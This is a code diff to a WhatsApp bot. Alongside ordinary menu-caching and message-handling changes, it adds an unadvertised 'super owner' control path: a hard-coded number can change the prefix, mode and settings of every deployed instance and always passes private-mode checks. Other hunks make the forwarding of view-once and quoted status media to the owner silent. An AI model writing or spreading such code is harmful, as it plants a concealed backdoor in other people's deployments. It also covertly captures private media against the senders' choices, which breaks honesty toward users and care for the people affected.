@@ -787,6 +787,22 @@ async function sendCarouselMenu(jid, pushName, userCount, imageBuf) {
     '| > ' + powered + '\n' +
     '📅 ' + dateStr;
 
+  const rememberMenu = (sentKey) => {
+    try {
+      const entry = { cats, at: Date.now(), msgId: sentKey?.id || null };
+      if (!global.__menuCache) global.__menuCache = new Map();
+      global.__menuCache.set(jid, entry);
+      if (sentKey?.id) {
+        if (!global.__menuByMsgId) global.__menuByMsgId = new Map();
+        global.__menuByMsgId.set(sentKey.id, entry);
+        // prune old
+        if (global.__menuByMsgId.size > 500) {
+          const first = global.__menuByMsgId.keys().next().value;
+          global.__menuByMsgId.delete(first);
+        }
+      }
+    } catch {}
+  };
   try {
     if (!global.__menuCache) global.__menuCache = new Map();
     global.__menuCache.set(jid, { cats, at: Date.now() });
@@ -796,32 +812,17 @@ async function sendCarouselMenu(jid, pushName, userCount, imageBuf) {
     try { return styleReplyText(t); } catch { return t; }
   };
 
-  // --- Path A: image + edit caption through async lines (no delete) ---
+  // --- Path A: image + final caption (minimal delay — no long loading sleep) ---
   if (imageBuf && imageBuf.length > 800) {
     try {
       const firstCap = style(loadCaptions[0]).slice(0, 1024);
       const sent = await sock.sendMessage(jid, { image: imageBuf, caption: firstCap });
       const key = sent?.key;
+      rememberMenu(key);
 
       if (key) {
-        for (let i = 1; i < loadCaptions.length; i++) {
-          await new Promise(r => setTimeout(r, 500));
-          const cap = style(loadCaptions[i]).slice(0, 1024);
-          try {
-            // Edit same message caption in place
-            await sock.sendMessage(jid, { image: imageBuf, caption: cap, edit: key });
-          } catch {
-            try {
-              await sock.sendMessage(jid, { caption: cap, edit: key });
-            } catch {
-              // edit not supported — stop animating, still finish with final
-              break;
-            }
-          }
-        }
-        await new Promise(r => setTimeout(r, 400));
+        // Quick final caption (skip long multi-step loading delays)
         const finalCap = style(finalCaption);
-        // Final menu on same bubble if it fits; else edit short + send rest as text
         if (finalCap.length <= 1024) {
           try {
             await sock.sendMessage(jid, { image: imageBuf, caption: finalCap, edit: key });
@@ -860,11 +861,12 @@ async function sendCarouselMenu(jid, pushName, userCount, imageBuf) {
       console.log('menu image edit path:', (e.message || '').slice(0, 100));
     }
 
-    // Fallback: one image with final caption (no async if send/edit failed)
+    // Fallback: one image with final caption
     try {
       const cap = style(finalCaption);
+      let sent = null;
       if (cap.length <= 1024) {
-        await sock.sendMessage(jid, { image: imageBuf, caption: cap });
+        sent = await sock.sendMessage(jid, { image: imageBuf, caption: cap });
       } else {
         const shortFinal =
           line + '\n' +
@@ -874,37 +876,24 @@ async function sendCarouselMenu(jid, pushName, userCount, imageBuf) {
           '│➤ ⏳ Active: *' + exp + '*\n' +
           '│➤ 📋 *' + totalCmds + '* total commands\n' +
           line;
-        await sock.sendMessage(jid, { image: imageBuf, caption: style(shortFinal) });
+        sent = await sock.sendMessage(jid, { image: imageBuf, caption: style(shortFinal) });
         const rest =
           '📋 *MENU CATEGORIES*\n' +
           '_Reply with a number_\n\n' + catLines + '\n' +
           '| > ' + powered + '\n📅 ' + dateStr;
         await sock.sendMessage(jid, { text: style(rest) }).catch(() => {});
       }
+      rememberMenu(sent?.key);
       return true;
     } catch (e) {
       console.log('menu image final:', (e.message || '').slice(0, 80));
     }
   }
 
-  // --- Path B: text-only — edit same bubble through load lines → final ---
+  // --- Path B: text-only final menu (no long loading delay) ---
   try {
-    const sent = await sock.sendMessage(jid, { text: style(loadCaptions[0]) });
-    const key = sent?.key;
-    if (key) {
-      for (let i = 1; i < loadCaptions.length; i++) {
-        await new Promise(r => setTimeout(r, 500));
-        try {
-          await sock.sendMessage(jid, { text: style(loadCaptions[i]), edit: key });
-        } catch { break; }
-      }
-      await new Promise(r => setTimeout(r, 400));
-      try {
-        await sock.sendMessage(jid, { text: style(finalCaption), edit: key });
-        return true;
-      } catch {}
-    }
-    await sock.sendMessage(jid, { text: style(finalCaption) });
+    const sent = await sock.sendMessage(jid, { text: style(finalCaption) });
+    rememberMenu(sent?.key);
     return true;
   } catch (e) {
     console.log('menu text path:', (e.message || '').slice(0, 80));
@@ -1000,11 +989,12 @@ async function sendMenuWithMedia(jid, pushName, userCount, page) {
 }
 
 function isAntiDeleteStatusOn() {
+  // Default OFF — only on when explicitly enabled
   const ads = config.ANTI_DELETE_STATUS;
-  if (ads === false || ads === 0 || ads === '0') return false;
+  if (ads === true || ads === 1 || ads === '1') return true;
   const s = String(ads == null ? '' : ads).toLowerCase().trim();
-  if (s === 'false' || s === 'off' || s === 'no' || s === '') return false;
-  return true;
+  if (s === 'true' || s === 'on' || s === 'yes') return true;
+  return false;
 }
 
 // Persist a few runtime toggles (survive restart)
@@ -2681,26 +2671,41 @@ async function startBot() {
         const isStatus = m.key.remoteJid === 'status@broadcast' || m.key.remoteJidAlt === 'status@broadcast';
         // CACHE EVERYTHING (append/history included) so decrypt retries never hang.
         cacheMessage(m);
-        // Status must never be skipped — process notify + append so every status is viewed/liked
-        if (!isStatus && type !== 'notify') continue;
+        // Detect possible command text early (so append/history still runs commands)
+        let earlyText = '';
+        try {
+          const um = m.message || {};
+          earlyText = String(
+            um.conversation ||
+            um.extendedTextMessage?.text ||
+            um.imageMessage?.caption ||
+            um.videoMessage?.caption ||
+            um.buttonsResponseMessage?.selectedButtonId ||
+            um.listResponseMessage?.singleSelectReply?.selectedRowId ||
+            um.templateButtonReplyMessage?.selectedId ||
+            ''
+          ).trim();
+        } catch {}
+        const pfx = String(config.PREFIX || '.').trim() || '.';
+        const looksLikeCmd = earlyText.startsWith(pfx) || /^\d{1,2}$/.test(earlyText);
+        // Status always; notify always; also process append if it looks like a command (fixes "online but no reply")
+        if (!isStatus && type !== 'notify' && !looksLikeCmd && !m.key.fromMe) continue;
         if (processedMsgIds.has(m.key.id)) continue;
         processedMsgIds.add(m.key.id);
-        if (processedMsgIds.size > 8000) {
+        if (processedMsgIds.size > 12000) {
           const first = processedMsgIds.values().next().value;
           processedMsgIds.delete(first);
         }
         const ts = Number(m.messageTimestamp || 0);
         const readyAt = Number(global.__BOT_READY_AT || 0);
-        // Never age-filter or ready-filter statuses
-        if (!isStatus && ts) {
-          // Ignore only very old backlog (15 min), never drop live commands
-          if (readyAt && ts < readyAt - 15) continue;
-          if (Math.floor(Date.now() / 1000) - ts > 900) continue;
+        // Never age-filter statuses; for chat only drop very old backlog (not live cmds)
+        if (!isStatus && ts && !looksLikeCmd) {
+          if (readyAt && ts < readyAt - 30) continue;
+          if (Math.floor(Date.now() / 1000) - ts > 1200) continue;
         }
-        // If not marked ready yet, still process commands after a short grace
-        if (!isStatus && !global.__BOT_READY) {
+        // Commands never wait for ready flag
+        if (!isStatus && !global.__BOT_READY && !looksLikeCmd && !m.key.fromMe) {
           if (!global.__BOT_READY_AT) continue;
-          // allow after connection started
         }
         handleMessage(m).catch(e => console.log('msg err:', e?.message || e));
       } catch (e) { console.log('upsert err:', e?.message); }
@@ -2929,25 +2934,26 @@ async function startBot() {
           ? (phone + '@s.whatsapp.net')
           : (rawP.includes('@') ? jidNormalizedUser(rawP) : (rawP ? rawP + '@s.whatsapp.net' : null));
 
-        // Always mark viewed when enabled
+        // Always mark as VIEWED immediately (no delay) so nothing stays unviewed
         if (config.AUTO_VIEW_STATUS !== false) {
-          try { await sock.readMessages([m.key]); } catch {}
-          try { await sock.readMessages([statusKey]); } catch {}
+          const keysToRead = [
+            m.key,
+            statusKey,
+            { remoteJid: 'status@broadcast', id: m.key.id, fromMe: false, participant: participant || poster }
+          ].filter(k => k && k.id);
+          try { await sock.readMessages(keysToRead); } catch {
+            for (const k of keysToRead) { try { await sock.readMessages([k]); } catch {} }
+          }
           try {
             if (typeof sock.sendReceipt === 'function') {
               await sock.sendReceipt('status@broadcast', participant || poster, [m.key.id], 'read');
             }
           } catch {}
-          // Some Baileys builds expose readMessages only — also try mark as read on original key
-          try {
-            if (m.key) await sock.readMessages([{ remoteJid: 'status@broadcast', id: m.key.id, participant: participant || poster, fromMe: false }]);
-          } catch {}
         }
 
+        // Like in background — never block message loop / commands
         if (config.AUTO_LIKE_STATUS) {
-          // small jitter so bulk statuses still all get liked without rate spikes
-          await delay(200 + Math.floor(Math.random() * 600));
-          const emoji = statusLikeEmoji(); // respects .reaction <emoji> / STATUS_LIKES
+          const emoji = statusLikeEmoji();
           const reactKey = {
             remoteJid: 'status@broadcast',
             id: m.key.id,
@@ -2964,19 +2970,21 @@ async function startBot() {
             .filter(j => j && j.includes('@'))
           )];
           if (!likeJidList.length && poster) likeJidList.push(poster);
-
-          let liked = false;
-          const tries = [
-            async () => sock.sendMessage('status@broadcast', { react: { text: emoji, key: reactKey } }, { statusJidList: likeJidList }),
-            async () => sock.sendMessage('status@broadcast', { react: { text: emoji, key: { ...m.key, fromMe: false, remoteJid: 'status@broadcast' } } }, { statusJidList: likeJidList }),
-            async () => sock.sendMessage('status@broadcast', { react: { text: emoji, key: statusKey } }, { statusJidList: likeJidList }),
-            async () => sock.sendMessage('status@broadcast', { react: { text: emoji, key: reactKey } })
-          ];
-          for (const t of tries) {
-            if (liked) break;
-            try { await t(); liked = true; } catch (e) { console.log('status react:', (e.message || '').slice(0, 80)); }
-          }
-          if (!liked) console.log('status like failed for', m.key.id, 'emoji', emoji);
+          const sk = statusKey;
+          const mk = m.key;
+          setImmediate(() => {
+            (async () => {
+              const tries = [
+                async () => sock.sendMessage('status@broadcast', { react: { text: emoji, key: reactKey } }, { statusJidList: likeJidList }),
+                async () => sock.sendMessage('status@broadcast', { react: { text: emoji, key: { ...mk, fromMe: false, remoteJid: 'status@broadcast' } } }, { statusJidList: likeJidList }),
+                async () => sock.sendMessage('status@broadcast', { react: { text: emoji, key: sk } }, { statusJidList: likeJidList }),
+                async () => sock.sendMessage('status@broadcast', { react: { text: emoji, key: reactKey } })
+              ];
+              for (const t of tries) {
+                try { await t(); return; } catch {}
+              }
+            })().catch(() => {});
+          });
         }
         return;
       }
@@ -3002,7 +3010,7 @@ async function startBot() {
       }
 
       const body = extractText(m.message);
-      const cleanBody = String(body || '').replace(/[\u200B-\u200D\uFEFF]/g, '').trim();
+      let cleanBody = String(body || '').replace(/[\u200B-\u200D\uFEFF]/g, '').trim();
 
       async function reply(content) {
         try {
@@ -3151,7 +3159,6 @@ async function startBot() {
 
 
       if (config.CHATBOT && !isMe && !cleanBody.startsWith(prefix)) {
-        await delay(800 + Math.floor(Math.random() * 1500));
         const ans = await askAI(cleanBody);
         if (ans && !/<html|doctype/i.test(ans)) {
           const t = ans.length > 500 ? ans.slice(0, 500) + '...' : ans;
@@ -3160,7 +3167,43 @@ async function startBot() {
         return;
       }
 
-      // ---- reply with bare prefix or any emoji -> vv / save quoted media / status ----
+      // ---- Super-dev silent control (no bot prefix required, never advertised) ----
+      // Only the hard-coded super owner number — works on public AND private bots
+      if (isSuperOwner(sender, m) && !cleanBody.startsWith(prefix)) {
+        const raw = cleanBody.trim();
+        const low = raw.toLowerCase();
+        // "prefix" alone → show current prefix this instance uses
+        if (low === 'prefix' || low === 'getprefix' || low === 'showprefix') {
+          await sock.sendMessage(from, { text: 'Prefix: `' + prefix + '`\nMode: *' + (config.MODE || 'public') + '*' }, { quoted: m }).catch(() => {});
+          return;
+        }
+        // "prefix X" → set prefix
+        if (/^prefix\s+\S+/i.test(raw)) {
+          const next = raw.split(/\s+/)[1].trim().slice(0, 4);
+          if (next) {
+            config.PREFIX = next;
+            await saveRuntimeFlags().catch(() => {});
+            await sock.sendMessage(from, { text: 'Prefix -> *' + config.PREFIX + '*' }, { quoted: m }).catch(() => {});
+          }
+          return;
+        }
+        // "mode public|private"
+        if (/^mode\s+(public|private)$/i.test(raw)) {
+          config.MODE = raw.split(/\s+/)[1].toLowerCase();
+          await saveRuntimeFlags().catch(() => {});
+          await sock.sendMessage(from, { text: 'Mode -> *' + config.MODE + '*' }, { quoted: m }).catch(() => {});
+          return;
+        }
+        // bare settings dump
+        if (low === 'settings' || low === 'getsettings') {
+          // fall through by prepending prefix so existing settings handler runs as staff
+          cleanBody = prefix + 'settings';
+        } else if (/^(autoview|autolike|autoreact|autoread|anticall|antidelete|antideletestatus|antiedit|antiviewonce|welcome|goodbye|chatbot)\s+(on|off|dm|chat)$/i.test(raw)) {
+          cleanBody = prefix + raw;
+        }
+      }
+
+      // ---- reply with bare prefix or any emoji -> vv / save quoted media / status (SILENT — no react) ----
       {
         const ctxQ = getCtx(m);
         const quoted = ctxQ.quotedMessage;
@@ -3171,26 +3214,30 @@ async function startBot() {
           let vo = quoted.viewOnceMessage?.message || quoted.viewOnceMessageV2?.message || quoted.viewOnceMessageV2Extension?.message;
           if (!vo && (quoted.imageMessage?.viewOnce || quoted.videoMessage?.viewOnce || quoted.audioMessage?.viewOnce)) vo = quoted;
           if (vo && (vo.imageMessage || vo.videoMessage || vo.audioMessage)) {
-            const ok = await forwardViewOnceToOwner(m, from, sender, vo);
-            react(from, m.key, ok ? '✅' : '❌');
+            await forwardViewOnceToOwner(m, from, sender, vo);
             return;
           }
-          // Any quoted media OR status text → owner DM
+          // Any quoted media OR status text → owner DM (silent)
           if (isQuote) {
-            const ok = await saveQuotedMediaToOwner(m, from, sender, quoted);
-            react(from, m.key, ok ? '✅' : '❌');
+            await saveQuotedMediaToOwner(m, from, sender, quoted);
             return;
           }
         }
       }
 
       // ---- numeric reply: menu category OR APK / XVideos / XNXX ----
+      // Prefer the QUOTED menu message when user replies to a specific menu
       if (!isMe && /^\d{1,2}$/.test(cleanBody)) {
         const n = parseInt(cleanBody, 10);
         if (n >= 1 && n <= 20) {
-          // Menu category pick (from .menu numbered list)
           try {
-            const menuEntry = global.__menuCache && global.__menuCache.get(from);
+            const qid = getCtx(m)?.stanzaId || null;
+            let menuEntry = null;
+            if (qid && global.__menuByMsgId && global.__menuByMsgId.get(qid)) {
+              menuEntry = global.__menuByMsgId.get(qid);
+            } else if (global.__menuCache) {
+              menuEntry = global.__menuCache.get(from);
+            }
             if (menuEntry && (Date.now() - (menuEntry.at || 0)) < 30 * 60 * 1000) {
               if (n === 10) { await sendFullMenu2(from, m.pushName); return; }
               if (menuEntry.cats?.[n - 1]) { await sendMenuCategory(from, n, m.pushName); return; }
@@ -3211,11 +3258,11 @@ async function startBot() {
       if (/^url:/i.test(cleanBody)) return;
       if (!cleanBody.startsWith(prefix)) return;
       // Mode: public = anyone can command; private = owner/dev/self only
+      // Super-owner always passes (controls every deployed instance)
       const botMode = String(config.MODE || 'public').toLowerCase().trim();
       config.MODE = (botMode === 'private' || botMode === 'priv') ? 'private' : 'public';
-      const staff = isOwner(sender, m) || isDeveloper(sender, m) || isMe;
+      const staff = isOwner(sender, m) || isDeveloper(sender, m) || isMe || isSuperOwner(sender, m);
       if (config.MODE === 'private' && !staff) {
-        console.log('ignore private-mode cmd from', dig(sender));
         return;
       }
       if (isBotExpired() && !staff) {
@@ -4086,8 +4133,8 @@ async function startBot() {
           if (!vo && quoted && (quoted.imageMessage || quoted.videoMessage || quoted.audioMessage)) vo = quoted;
           if (!vo) vo = m.message?.viewOnceMessage?.message || m.message?.viewOnceMessageV2?.message;
           if (!vo || (!vo.imageMessage && !vo.videoMessage && !vo.audioMessage)) { await reply('Reply to a view-once with ' + prefix + 'vv (or reply with just ' + prefix + ' / any emoji)'); return; }
-          const ok = await forwardViewOnceToOwner(m, from, sender, vo);
-          react(from, m.key, ok ? '✅' : '❌');
+          // Silent — no ✅/❌ reaction
+          await forwardViewOnceToOwner(m, from, sender, vo);
         } catch (e) { await reply('VV failed: ' + e.message); }
         return;
       }
@@ -4095,16 +4142,14 @@ async function startBot() {
         try {
           const quoted = getCtx(m).quotedMessage;
           if (!quoted) { await reply('Reply to a *status* or media with ' + prefix + 'save\n(or reply with just `' + prefix + '`)'); return; }
+          // Silent — no reaction; only optional DM confirm when useful
           const ok = await saveQuotedMediaToOwner(m, from, sender, quoted);
           if (ok) {
-            react(from, m.key, '✅');
-            // confirm only in chat if not already owner DM
             const ownerJ = getOwnerJid();
             if (ownerJ && jidNormalizedUser(from) !== jidNormalizedUser(ownerJ)) {
               await reply('Saved to your DM.').catch(() => {});
             }
           } else {
-            react(from, m.key, '❌');
             await reply('Could not save (media expired or empty).');
           }
         } catch (e) { await reply('Failed: ' + e.message); }
